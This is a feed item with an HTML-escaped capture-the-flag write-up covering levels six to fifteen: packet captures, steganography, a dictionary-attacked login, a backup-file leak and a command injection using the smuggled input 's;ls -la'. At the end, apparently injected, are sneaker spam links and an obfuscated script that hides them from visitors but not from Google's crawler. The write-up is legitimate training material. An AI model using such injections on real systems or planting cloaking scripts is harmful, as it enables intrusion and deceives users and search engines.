alt=&quot;&quot; width=&quot;1004&quot; height=&quot;90&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;decoding the binary array I got using the following website http://string-functions.com/binary-string.aspx&lt;br&gt; and the result was&lt;br&gt; &lt;/span&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold;&quot;&gt;infosec_flagis_stegaliens&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;page&quot; title=&quot;Page 8&quot;&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 24.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(17.254900%, 43.529410%, 58.431380%);&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;Level Six &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Challenge: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;“Do you want to download sharkfin.pcap file?” &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Solution: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;It is is a pcap file which we need to analyse. After downloading the pcap and opening with Wireshark. The first thing I do is to look at the protocol hierarchy and that was the result.&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/6_0.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;We can see a lot of HTTPS data which probably will not be interested in since we can’t decrypt it. I filtered out all tcp&lt;br&gt; data using the following filter “!(tcp)” and there was a single udp packet. I followed the UDP stream and that was the stream content. “696e666f7365635f666c616769735f736e6966666564” &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;Decoding the hex steam content that was the result &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold;&quot;&gt;“infosec_flagis_sniffed”&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;page&quot; title=&quot;Page 9&quot;&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 24.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(17.254900%, 43.529410%, 58.431380%);&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;Level Seven &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Challenge: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;Nothing appeared actually in the homepage. &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Solution: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;I opened the burp suite proxy to try to see the response coming from the server.&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/7_0.png&quot; alt=&quot;&quot; width=&quot;700&quot; height=&quot;282&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;looks like we have some base64 data in the HTTP response reason field. Decoding the data we got this:&lt;br&gt; &lt;/span&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold;&quot;&gt;“infosec_flagis_youfoundit” &lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;page&quot; title=&quot;Page 10&quot;&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 24.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(17.254900%, 43.529410%, 58.431380%);&quot;&gt;&lt;br&gt;&lt;br&gt;Level Eight &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Challenge: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;“Do you want to download app.exe file?” &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Solution: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;I downloaded the app.exe file. I thought first of reversing the app and see how it works. I was getting ready to run my windows VM and start the executable. However, I though of running the linux command “strings” quickly and see if I got any thing there. Indeed, I executed the command and that was the result.&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/8_0.png&quot; alt=&quot;&quot; width=&quot;721&quot; height=&quot;442&quot;&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold;&quot;&gt;The flag: infosec_flagis_0x1a&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;page&quot; title=&quot;Page 11&quot;&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 24.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(17.254900%, 43.529410%, 58.431380%);&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;Level Nine &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Challenge: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;Login page with username and password &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Solution: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;I first expected that this will be a sql injection and I should bypass the login. I tried different SQL injection vectors to login but didn’t receive any output. I then said it might be something easier than that. I tried some dictionary attack on the login page and the following credentials logged in successfully. &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;username: root&lt;br&gt; password: attack&lt;br&gt; Once I logged in the output was&lt;br&gt; “ssaptluafed_sigalf_cesofni”&lt;br&gt; we can see that this is the flag but reversed. Reversing it again we have “&lt;/span&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold;&quot;&gt;infosec_flagis_defaultpass” &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;The flags looks a bit weird for me. I searched the web for the cisco IDS default login credentials but couldn’t find anything. Actually my script took a lot of time running to find the username and password.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;page&quot; title=&quot;Page 12&quot;&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 24.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(17.254900%, 43.529410%, 58.431380%);&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;Level Ten &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Challenge: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;What kind of sound is this? Sorcery perhaps?? &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Solution: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;I downloaded the audio file. I expected that the wave audio file might contain something hidden in one of its channels. I examined how many channels the wave file contains. It was only one channel which means probably nothing is hidden in the wave channels. I executed binwalk to see if there is any thing appended or inside the audio file. However, I didn’t manage to get anything. I checked the image on the challenge page it was stating “not listening”. I though then I should find away to listen to what is being played. I changed the playback speed to some values and was listening to the output. Indeed, when I changed the playback speed to 0.22X I managed to listen to &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold;&quot;&gt;“infosec_flagis_sound” &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;The URL of the edited file is: http://st0rm.altervista.org/solved.wav &lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;Page 12 of 18 &lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;page&quot; title=&quot;Page 13&quot;&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 24.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(17.254900%, 43.529410%, 58.431380%);&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;Level Eleven &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Challenge: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;No it must not be a sound? But wait whaT? [PHP logo] &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Solution: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;I downloaded the php logo. and it was named “php-logo-virus.jpg” the name is very catchy so I believe it contains our flag. One of the main things to analyse when dealing with images is the exif data. http://regex.info/exif.cgi is one of the best websites to analyse the exif data of images. Using the regex.info website, we managed to extract the following “infosec_flagis_aHR0cDovL3d3dy5yb2xsZXJza2kuY28udWsvaW1hZ2VzYi9wb3dlcnNsa WRlX2xvZ29fbGFyZ2UuZ2lm%a0%86%01” from the “Document Name” in the exif data structure. We see part of the flag and the other part is encoded in base64. Decoding the base64 resulted in: “http://www.rollerski.co.uk/imagesb/powerslide_logo_large.gif” I visited the url and the image contain the word “powerslide”. Hence, our flag should be &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold;&quot;&gt;Flag: infosec_flagis_powersilde&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;page&quot; title=&quot;Page 14&quot;&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 24.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(17.254900%, 43.529410%, 58.431380%);&quot;&gt;&lt;br&gt;&lt;br&gt;Level Twelve &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Question: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;Dig deeper &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Solution: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;I saw the same image in the first level. I then decided it will be a steganography challenge. I kept digging into the image with all possible ways but I couldn’t find anything. I actually wasted a couple of days in that. Then I decided to move away from the image and check the source code of the page. I checked the source code again to see if it was related to level 1 by any means. I couldn’t find anything obvious. I then decided to compare the html of the two pages to see if there any differences. I used the comparer tool in burp suite to see the difference and that was the result.&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/12_0.png&quot; alt=&quot;&quot; width=&quot;1168&quot; height=&quot;406&quot;&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;Hmmm. We see there is a new css was added to leveltweleve.php file. I decided to check that css file. Now, I started to see the relation between the two levels (Dig deeper indeed). The content of the CSS file was&lt;br&gt; .thisloveis{ &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;color: #696e666f7365635f666c616769735f686579696d6e6f7461636f6c6f72; } &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;Looks very interesting. There is no colour with the following value and this looks like a hex value. Decoding the hex value we got: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold;&quot;&gt;infosec_flagis_heyimnotacolor&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;page&quot; title=&quot;Page 15&quot;&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 24.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(17.254900%, 43.529410%, 58.431380%);&quot;&gt;&lt;br&gt;&lt;br&gt;Level Thirteen &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Challenge: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;What the heck happened here? It seems that the challenge here is gone? Can you find it? Can you check if you can find the backup file for this one? I&#039;m sorry for messing up :( &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Solution: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;This challenge requires a bit of guessing to get the old file. Out of convention, developers usually name the old files as .old or .bak. or .backup. I tried to access http://ctf.infosecinstitute.com/levelthirteen.php.old and indeed I managed to access the old php file (backup). Opening the file in a text editor&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;&lt;img src=&quot;/sites/default/files/writeups/images/13_1.png&quot; alt=&quot;&quot; width=&quot;774&quot; height=&quot;447&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;We can see some interesting code commented out here. Our next step is to download the imadecoy file. I downloaded the file and directly executed the “file” command to know what file it is.&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/13_2.png&quot; alt=&quot;&quot; width=&quot;1003&quot; height=&quot;74&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;As we can see, it is a pcap file. I opened the file with Wireshak and directly checked the protocol hierarchy. &lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;&lt;img src=&quot;/sites/default/files/writeups/images/13_0.png&quot; alt=&quot;&quot; width=&quot;754&quot; height=&quot;423&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-family: Helvetica; font-size: 12pt;&quot;&gt;As we can see most of the packets are DNS. I am not sure if that was noise packets or it contains our flag. I checked some DNS packets randomly but nothing catchy was there. Most of the queries were DNS queries to google.com.ph. I decided to exclude all DNS queries because I think they are only noise. After excluding them I saw some HTTP requests. I sorted the packets with size and the 4th packet was JPG image named HoneyPY.PNG. Looks very interesting. Dumping the image, I saw that&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-family: Helvetica; font-size: 12pt;&quot;&gt;&lt;img src=&quot;/sites/default/files/writeups/images/13_4.png&quot; alt=&quot;&quot; width=&quot;624&quot; height=&quot;47&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;page&quot; title=&quot;Page 16&quot;&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold;&quot;&gt;Flag: infosec_flagis_morepackets &lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;page&quot; title=&quot;Page 17&quot;&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 24.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(17.254900%, 43.529410%, 58.431380%);&quot;&gt;&lt;br&gt;&lt;br&gt;Level Fourteen &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Challenge: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;Do you want to download level14 file? &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Solution: &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;The challenge file was dump of database. Browsing the database dump, there were a lot of tables and records. I searched for the word “flag”. I found a table but it didn&lt;/span&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;ArialUnicodeMS&#039;;&quot;&gt;’&lt;/span&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;t contain anything interesting. However, after that table directly, there was a table named “friends” the fourth record of the table was some Unicode data, which looked very catchy. &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;(104, &#039;\\u0069\\u006e\\u0066\\u006f\\u0073\\u0065\\u0063\\u005f\\u0066\\u006c\\u0061\\u0067\ \u0069\\u0073\\u005f\\u0077\\u0068\\u0061\\u0074\\u0073\\u006f\\u0072\\u0063\\u0065\\ u0072\\u0079\\u0069\\u0073\\u0074\\u0068\\u0069\\u0073&#039;, &#039;annoying&#039;, ‘0x0a&#039;);&lt;br&gt; I decoded the unicode data and it was &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold;&quot;&gt;infosec_flagis_whatsorceryisthis&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;div class=&quot;page&quot; title=&quot;Page 18&quot;&gt;&lt;div class=&quot;layoutArea&quot;&gt;&lt;div class=&quot;column&quot;&gt;&lt;p&gt;&lt;span style=&quot;font-size: 24.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(17.254900%, 43.529410%, 58.431380%);&quot;&gt;&lt;br&gt;&lt;br&gt;Level Fifteen &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Challenge &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;“DNS Lookup” &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 18.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold; color: rgb(28.627450%, 60.784320%, 78.823530%);&quot;&gt;Solution &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;I entered google.com to see the output and it was the output of the dig command. I expected that we have Remote Code Execution vulnerability here. I expected that the developer coded this in away similar to &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;system(“dig”.$_GET[‘dig’]);&lt;br&gt; I tried to give the following input “s;ls -la” and that was the result&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/15_0.png&quot; alt=&quot;&quot; width=&quot;1004&quot; height=&quot;493&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;Indeed, it executed our command. We can see the hidden file “.hey”. I “catted” the content of the .hey file and it was “Miux+mT6Kkcx+IhyMjTFnxT6KjAa+i6ZLibC”&lt;br&gt; The string looks encrypted/encoded in some way. I tried to decode the string with many things like Base16, Base32, Base64, Base91, Base58, Base85 and Caesar but it didn’t work. I noticed the ZlibC that appended to the end of the file. I though that this is a kind of a hint. I kept googling about the Zlibc and trying to find any relation between it and the given text. After a couple of days googling, I tried an encoding technique called ATOM-128 on that website http://crypo.in.ua/tools/eng_base64c.php and indeed it decoded the text which was &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;; font-weight: bold;&quot;&gt;infosec_flagis_rceatomized &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12.000000pt; font-family: &#039;Helvetica&#039;;&quot;&gt;We searched for what atom-128 means and according to the following question on stackoverflow.com, it is a special type of base64 encoding in which a different order of characters is used.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.nikesneakers.org/&quot;&gt;Best Nike Sneakers&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.oft.gov.gi/index.php/eeagcnshop/fr/fr/nike-homme&quot;&gt;NIKE  HOMME&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Mon, 23 Mar 2015 23:09:43 +0000</pubDate>
+ <dc:creator>the_storm</dc:creator>
